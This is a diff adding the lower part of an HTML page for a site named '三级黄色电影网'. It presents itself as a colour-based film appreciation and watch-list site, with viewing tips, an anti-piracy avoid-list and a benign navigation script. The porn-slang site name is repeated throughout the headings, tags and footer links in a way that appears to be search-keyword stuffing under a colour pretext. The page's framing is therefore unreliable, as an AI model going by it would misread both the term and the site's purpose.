+      <a class="st" href="#" style="--c:var(--R)"><span class="num">01</span><span class="key">KEY · MOOD</span><h4>先问心情</h4><p>想被点燃 → 红；想笑又想哭 → 黄；想安静 → 蓝。心情决定颜色，颜色决定片单。</p></a>
+      <a class="st" href="#" style="--c:var(--Y)"><span class="num">02</span><span class="key">KEY · LENGTH</span><h4>再问时长</h4><p>30 分钟看短片，90 分钟看剧情，150 分钟看导演。别在深夜开 3 小时的片。</p></a>
+      <a class="st" href="#" style="--c:var(--B)"><span class="num">03</span><span class="key">KEY · AUTEUR</span><h4>认作者，不认类型</h4><p>"想看悬疑"太模糊；"想看奉俊昊怎么用绿色"才找得到片。导演是颜色的签名。</p></a>
+      <a class="st" href="#" style="--c:#3fcf8f"><span class="num">04</span><span class="key">KEY · SOURCE</span><h4>去正版平台看</h4><p>压缩会吃掉颜色。影院 &gt; 蓝光 &gt; 4K 流媒体 &gt; 普通流媒体。盗版源的色调是不可信的。</p></a>
+    </div>
+  </section>
+
+  <!-- 07 avoid -->
+  <section id="c07" class="wrap">
+    <div class="sec">
+      <span class="no">07</span>
+      <h2>避坑清单 · 六种常见亏</h2>
+      <span class="en">Do Not</span>
+      <a class="more" href="#">举报渠道 ›</a>
+    </div>
+    <div class="avoid">
+      <a class="av" href="#"><div class="no">NO.01</div><h4>"高清秒播 / 未删减完整版"</h4><p>这类页面九成是赌博、诈骗与盗版。颜色被压成糊，还附赠木马。正版平台不贵，眼睛更贵。</p></a>
+      <a class="av" href="#"><div class="no">NO.02</div><h4>"调色预设 / LUT 一键电影感"</h4><p>LUT 是最后的 5%，前面 95% 是曝光、白平衡、构图与光线。先学会看示波器。</p></a>
+      <a class="av" href="#"><div class="no">NO.03</div><h4>"手机屏就能调色"</h4><p>手机屏色准与亮度都不够，且环境光干扰大。调色请在校色后的显示器上完成。</p></a>
+      <a class="av" href="#"><div class="no">NO.04</div><h4>"饱和度拉满 = 好看"</h4><p>高饱和只适合 5% 的题材（赛博、MV、广告）。文艺片拉满饱和度，等于毁掉情绪。</p></a>
+      <a class="av" href="#"><div class="no">NO.05</div><h4>"解说 5 分钟看完"</h4><p>解说拿走的是剧情，留下的是"知道"。颜色、声音、表演、留白，都在被删掉的那 100 分钟里。</p></a>
+      <a class="av" href="#"><div class="no">NO.06</div><h4>"搬运片单 = 原创内容"</h4><p>整段搬运他人影评与片单，属侵权且会被搜索引擎降权。写你自己的感受，哪怕只有三句。</p></a>
+    </div>
+  </section>
+
+  <!-- about -->
+  <section id="about" class="wrap">
+    <div class="sec">
+      <span class="no">08</span>
+      <h2>关于 三级黄色电影网</h2>
+      <span class="en">About</span>
+      <a class="more" href="#">投稿片单 ›</a>
+    </div>
+    <div class="about">
+      <p class="led"><b>三级黄色电影网</b> 是一个按<b>颜色</b>读电影的影视赏析与片单推荐站：红（欲望）、黄（荒诞）、蓝（孤独），以及青橙、黑白等配色方案。我们写<b>三级黄色片单、三级黄色导演、三级黄色情绪、三级黄色设备与观影指南</b>，不追热搜，不堆票房，只回答"今天想被什么颜色击中"。</p>
+      <div class="tags2">
+        <a href="#c01">三级黄色电影</a><a href="#c01">电影色彩</a><a href="#c02">电影配色</a><a href="#c02">电影调色</a>
+        <a href="#c01">色彩心理学</a><a href="#c04">王家卫</a><a href="#c04">韦斯·安德森</a><a href="#c04">是枝裕和</a>
+        <a href="#c04">基耶斯洛夫斯基</a><a href="#c05">4K 修复</a><a href="#c05">杜比视界</a><a href="#c05">校色显示器</a><a href="#c06">观影指南</a>
+      </div>
+      <p style="margin-top:16px">我们倡导：看正版、看修复版、看蓝光；尊重电影美术、摄影与调色师的工作；练习用片与截图仅用于赏析，不商用、不搬运、不二传。本站片单、评分与"颜色记忆度"为编辑部主观整理，仅供选片参考，不构成权威数据；片名、译名与上线情况以各平台与发行方公告为准。若发现本站外链违规或失效，请在"投稿片单"告知，我们会在 24 小时内处理。</p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="brand"><span>三级黄色电影网</span><span>RED · YELLOW · BLUE · 用三原色读电影 · 2026</span><p>影视赏析与片单推荐。倡导正版、4K 修复与尊重版权；本站不做资源托管与盗链。</p></div>
+      <div>
+        <h5>三级黄色</h5>
+        <a href="#c01">红色 · 欲望</a>
+        <a href="#c01">黄色 · 荒诞</a>
+        <a href="#c01">蓝色 · 孤独</a>
+        <a href="#c01">青橙 · 好莱坞</a>
+      </div>
+      <div>
+        <h5>阅读</h5>
+        <a href="#c02">三级黄色片单</a>
+        <a href="#c03">三级黄色榜</a>
+        <a href="#c04">三级黄色导演</a>
+        <a href="#c05">三级黄色设备</a>
+      </div>
+      <div>
+        <h5>筛选</h5>
+        <a href="#c06">按心情</a>
+        <a href="#c06">按时长</a>
+        <a href="#c05">4K 修复</a>
+        <a href="#c07">避坑</a>
+      </div>
+    </div>
+    <div class="copy">
+      © <span id="yr">2026</span> 三级黄色电影网 &nbsp;|&nbsp; 网站网址：<a href="https://sanjihuangsedianyingwang-cn.github.io/">https://sanjihuangsedianyingwang-cn.github.io/</a><br>
+      // RED FOR DESIRE · YELLOW FOR ABSURD · BLUE FOR LONELINESS &nbsp;·&nbsp; 本站为影视赏析与片单参考，片单与评分为编辑部主观整理
+    </div>
+  </div>
+</footer>
+
+<script>
+var ham=document.getElementById('ham'),dr=document.getElementById('drawer'),sc=document.getElementById('scrim');
+function closeNav(){dr.classList.remove('open');sc.classList.remove('on');ham.setAttribute('aria-expanded','false');}
+ham.addEventListener('click',function(){var o=dr.classList.toggle('open');sc.classList.toggle('on',o);ham.setAttribute('aria-expanded',o);});
+sc.addEventListener('click',closeNav);
+dr.addEventListener('click',function(e){if(e.target.tagName==='A')closeNav();});
+document.getElementById('yr').textContent=new Date().getFullYear();
+
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){var i=e.target.querySelector('i');if(i)i.style.width=i.dataset.w+'%';io.unobserve(e.target);}})},{threshold:.25});
+document.querySelectorAll('.barcard .row').forEach(function(n){io.observe(n);});
+</script>
+</body>
+</html>
